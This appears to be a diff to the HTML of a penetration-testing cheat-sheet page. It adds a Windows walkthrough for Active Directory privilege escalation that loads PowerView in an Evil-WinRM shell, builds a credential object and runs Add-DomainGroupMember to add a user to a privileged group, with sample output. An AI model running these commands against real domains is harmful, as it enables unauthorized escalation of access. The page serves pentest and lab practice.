@@ -332,7 +332,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="privesc-1-add-self-to-group-from-linux">Privesc #1: Add self to group (From Linux)</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">bloodyAD</button>
+<button data-tabset="set1" data-tabcontent="tab1" >bloodyAD</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >powerview.py</button>
 
@@ -405,6 +405,37 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">InheritanceType             : None
 </span></span></span><span class="line"><span class="cl"><span class="go">SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></em></small></p></div></p>
+<h3 id="privesc-1-add-self-to-group-from-windows">Privesc #1: Add self to group (From Windows)</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" >Windows</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
+</span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a cred object (runas) [optional]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
+</span></span></code></pre></div><h4 id="3-add-self-to-group">3. Add self to group</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39; -Members &#39;&lt;USER&gt;&#39; -Credential $Cred
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Add-DomainGroupMember -Identity &#39;security engineers&#39; -Members &#39;user&#39; -Credential $Cred
+</span></span></span><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;security engineers&#39; -Members &#39;user&#39; -Credential $Cred
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainGroupMember -Identity &#39;security engineers&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &#39;security engineers&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GroupDomain             : corp.local
+</span></span></span><span class="line"><span class="cl"><span class="go">GroupName               : Security Engineers
+</span></span></span><span class="line"><span class="cl"><span class="go">GroupDistinguishedName  : CN=Security Engineers,CN=Users,DC=corp,DC=local
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberDomain            : corp.local
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberName              : user
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberObjectClass       : user
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
+</span></span></span></code></pre></div></div></p>
 
 </div></div>
     
